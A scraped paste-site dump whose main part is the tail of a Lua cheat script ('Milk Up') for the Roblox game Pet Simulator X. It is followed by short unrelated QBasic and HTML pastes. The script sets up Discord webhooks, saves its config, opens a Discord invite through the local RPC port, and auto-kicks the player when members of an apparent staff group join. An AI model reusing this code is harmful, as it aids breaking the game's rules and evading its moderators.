local SelectedHatchRarities = WebhooksTab:CreateParagraph({Title = ""Selected Rarities"", Content = table.concat(Config.Webhooks.HatchWebhook.Rarities, "", "")})

WebhooksTab:CreateDropdown({
	Name = ""Choose Rarities"",
	CurrentOption = """",
	Options = RaritiesList,
	Callback = function(Value)
        if not table.find(Config.Webhooks.HatchWebhook.Rarities, Value) then
            table.insert(Config.Webhooks.HatchWebhook.Rarities, Value)
        elseif table.find(Config.Webhooks.HatchWebhook.Rarities, Value) then
            for i,v in pairs(Config.Webhooks.HatchWebhook.Rarities) do
                if v == Value then
                    table.remove(Config.Webhooks.HatchWebhook.Rarities, i)
                end
            end
        end
        SelectedHatchRarities:Set({Title = ""Selected Rarities"", Content = table.concat(Config.Webhooks.HatchWebhook.Rarities, "", "")})
	end
})

local WebhookSellingSection = WebhooksTab:CreateSection(""Selling"")

WebhooksTab:CreateToggle({
	Name = ""Start Sell Webhook"",
    CurrentValue = Config.Webhooks.SellWebhook.StartWebhook,
    Flag = ""ToggleStartSellWebhook"",
	Callback = function(Value)
        Config.Webhooks.SellWebhook.StartWebhook = Value
    end
})

WebhooksTab:CreateInput({
	Name = ""Discord Webhook"",
	PlaceholderText  = Config.Webhooks.SellWebhook.ChoosenWebhook,
	RemoveTextAfterFocusLost  = false,
	Callback = function(Value)
        Config.Webhooks.SellWebhook.ChoosenWebhook = Value
	end
})

WebhooksTab:CreateToggle({
	Name = ""Ping User"",
    CurrentValue = Config.Webhooks.SellWebhook.PingUser,
    Flag = ""ToggleSellPingUser"",
	Callback = function(Value)
        Config.Webhooks.SellWebhook.PingUser = Value
    end
})

WebhooksTab:CreateInput({
	Name = ""ID To Ping"",
	PlaceholderText  = Config.Webhooks.SellWebhook.ChoosenUserID,
	RemoveTextAfterFocusLost  = false,
	Callback = function(Value)
		Config.Webhooks.SellWebhook.ChoosenUserID = Value
	end
})

WebhooksTab:CreateToggle({
	Name = ""Show Bought For"",
    CurrentValue = Config.Webhooks.SellWebhook.ShowSoldFor,
    Flag = ""ToggleSellShowBoughtFor"",
	Callback = function(Value)
        Config.Webhooks.SellWebhook.ShowSoldFor = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Total Gems"",
    CurrentValue = Config.Webhooks.SellWebhook.ShowTotalGems,
    Flag = ""ToggleSellShowTotalGems"",
	Callback = function(Value)
        Config.Webhooks.SellWebhook.ShowTotalGems = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Bought By"",
    CurrentValue = Config.Webhooks.SellWebhook.ShowPurchasedBy,
    Flag = ""ToggleSellShowBoughtBy"",
	Callback = function(Value)
        Config.Webhooks.SellWebhook.ShowPurchasedBy = Value
    end
})

if Premium then
local WebhookSnipingSection = WebhooksTab:CreateSection(""Sniping"")
 
WebhooksTab:CreateToggle({
	Name = ""Start Snipe Webhook"",
    CurrentValue = Config.Webhooks.SnipeWebhook.StartWebhook,
    Flag = ""ToggleStartSnipeWebhook"",
	Callback = function(Value)
        Config.Webhooks.SnipeWebhook.StartWebhook = Value
    end
})

WebhooksTab:CreateInput({
	Name = ""Discord Webhook"",
	PlaceholderText  = Config.Webhooks.SnipeWebhook.ChoosenWebhook,
	RemoveTextAfterFocusLost  = false,
	Callback = function(Value)
        Config.Webhooks.SnipeWebhook.ChoosenWebhook = Value
	end
})

WebhooksTab:CreateToggle({
	Name = ""Ping User"",
    CurrentValue = Config.Webhooks.SnipeWebhook.PingUser,
    Flag = ""ToggleSnipePingUser"",
	Callback = function(Value)
        Config.Webhooks.SnipeWebhook.PingUser = Value
    end
})

WebhooksTab:CreateInput({
	Name = ""ID To Ping"",
	PlaceholderText  = Config.Webhooks.SnipeWebhook.ChoosenUserID,
	RemoveTextAfterFocusLost  = false,
	Callback = function(Value)
		Config.Webhooks.SnipeWebhook.ChoosenUserID = Value
	end
})

WebhooksTab:CreateToggle({
	Name = ""Show Gems Sniped For"",
    CurrentValue = Config.Webhooks.SnipeWebhook.ShowGemsSnipedFor,
    Flag = ""ToggleSnipeShowGemsSnipedFor"",
	Callback = function(Value)
        Config.Webhooks.SnipeWebhook.ShowGemsSnipedFor = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Gems Remaining"",
    CurrentValue = Config.Webhooks.SnipeWebhook.ShowGemsRemaining,
    Flag = ""ToggleSnipeShowGemsRemaining"",
	Callback = function(Value)
        Config.Webhooks.SnipeWebhook.ShowGemsRemaining = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Owner"",
    CurrentValue = Config.Webhooks.SnipeWebhook.ShowOwner,
    Flag = ""ToggleSnipeShowOwner"",
	Callback = function(Value)
        Config.Webhooks.SnipeWebhook.ShowOwner = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Strength"",
    CurrentValue = Config.Webhooks.SnipeWebhook.ShowStrength,
    Flag = ""ToggleSnipeShowStrength"",
	Callback = function(Value)
        Config.Webhooks.SnipeWebhook.ShowStrength = Value
    end
})

WebhooksTab:CreateToggle({
	Name = ""Show Enchants"",
    CurrentValue = Config.Webhooks.SnipeWebhook.ShowEnchants,
    Flag = ""ToggleSnipeShowEnchants"",
	Callback = function(Value)
        Config.Webhooks.SnipeWebhook.ShowEnchants = Value
    end
})
end

local ConfigTab = Window:CreateTab(""Config (💾)"")

local LoadDeleteSection = ConfigTab:CreateSection(""Load/Delete Config"")

ConfigTab:CreateToggle({
	Name = ""Auto Load Config"",
    CurrentValue = IsLoadConfig,
	Callback = function(Value)
        IsLoadConfig = Value
        writefile(""MilkUp/PetSimulatorX/GlobalSettings.json"", HttpService:JSONEncode({[""LoadConfig""] = IsLoadConfig, [""SeparateConfig""] = IsSeparateConfig}))
        IsLoadConfig = HttpService:JSONDecode(readfile(""MilkUp/PetSimulatorX/GlobalSettings.json""))[""LoadConfig""]
    end
})

ConfigTab:CreateToggle({
	Name = ""Use Separate Config"",
    CurrentValue = IsSeparateConfig,
	Callback = function(Value)
        IsSeparateConfig = Value
        writefile(""MilkUp/PetSimulatorX/GlobalSettings.json"", HttpService:JSONEncode({[""LoadConfig""] = IsLoadConfig, [""SeparateConfig""] = IsSeparateConfig}))
        IsSeparateConfig = HttpService:JSONDecode(readfile(""MilkUp/PetSimulatorX/GlobalSettings.json""))[""SeparateConfig""]
    end
})

ConfigTab:CreateButton({
	Name = ""Save Config"",
	Callback = function()
        SaveConfig()
  	end
})


ConfigTab:CreateButton({
	Name = ""Delete Config"",
	Callback = function()
        DeleteConfig()
  	end
})

local ExtraConfigSection = ConfigTab:CreateSection(""Extra Config Options"")

local ConfigInputed
ConfigTab:CreateInput({
	Name = ""Insert Config"",
	PlaceholderText  = ""Insert Here"",
	RemoveTextAfterFocusLost  = false,
	Callback = function(Value)
        local ConfigJSONSuccess, ConfigJSONError = pcall(function() HttpService:JSONDecode(Value) end)
        if ConfigJSONSuccess then
            ConfigInputed = HttpService:JSONDecode(Value)
        end
	end
})

ConfigTab:CreateButton({
	Name = ""Set Config"",
	Callback = function()
        writefile(ConfigName, HttpService:JSONEncode(ConfigInputed))
  	end
})

ConfigTab:CreateButton({
	Name = ""Copy Config"",
	Callback = function()
        setclipboard(readfile(ConfigName))
  	end
})



RayField:Notify({
    Title = ""UI Loaded"",
    Content = ""Script Took ""..tick() - StartTick.. ""s"",
    Duration = 3,
})

RayField:Notify({
    Title = ""Discord"",
    Content = ""Would You Like To Join The Discord To Stay Updated?"",
    Duration = 3,
    Actions = {
        SendInvite = {
            Name = ""Yes"",
            Callback = function()
                HTTPRequest({ Url = ""http://127.0.0.1:6463/rpc?v=1"",
                Method = ""POST"",Headers = {[""Content-Type""] = ""application/json"",
                    [""Origin""] = ""https://discord.com""},
                        Body = game:GetService(""HttpService""):JSONEncode({cmd = ""INVITE_BROWSER"",
                            args = {code = ""tY2TN5mKCb""},
                                nonce = game:GetService(""HttpService""):GenerateGUID(false)
                            }
                        )
                    }
                )
            end
		},
        IgnoreInvite = {
            Name = ""No"",
            Callback = function()
                return
            end
		},
	},
})

for i,v in pairs(game.Players:GetChildren()) do
    if v:IsInGroup(5060810) then
        Player:Kick(""A Staff Was In Your Server (Protected By Milk Up)"")
    end
end

task.spawn(function()
    Players.PlayerAdded:Connect(function(NewPlayer)
        pcall(function()
            if NewPlayer:IsInGroup(5060810) then                    
                Player:Kick(""A Staff Has Joined Your Server (Protected By Milk Up)"")
            end
        end)
    end)
end)

else
    return
end"
3spHKMwh,Drawing the Twitter logo in QBasic,shdon,QBasic,Tuesday 27th of June 2023 08:08:31 AM CDT,"DEFINT A-Z
SCREEN 7
DO
  READ x, y, r
  c = 9 - SGN(SGN(r) + 1) * 9
  CIRCLE (x, y), ABS(r), 15, , , 1
  PAINT STEP(0, 0), 14, 15
  PAINT STEP(0, 0), c, 15
  CIRCLE STEP(0, 0), ABS(r), c, , , 1
LOOP UNTIL x = 185
DATA 148, 83, -56, 120, 79, 51, 148, 103, -19, 136, 89, 20, 140, 90, -19
DATA 131, 73, 19, 140, 74, -19, 166, 89, -19, 165, 33, 51, 197, 64, -17
DATA 204, 55, 19, 193, 57, -19, 186, 18, 51, 185, 81, -19

"
2Q7TARBM,Untitled,MastroPino,HTML,Tuesday 27th of June 2023 07:35:24 AM CDT,"<div class=""input-group input-group-sm mb-3"">
  <input type=""number"" class=""form-control"" placeholder=""DarthVader"" aria-label=""Modifica il prezzo"" aria-describedby=""basic-addon"">
  <span class=""input-group-text"" id=""basic-addon"">
		<i class=""bi bi-currency-euro""></I>
	</span>
</div>"
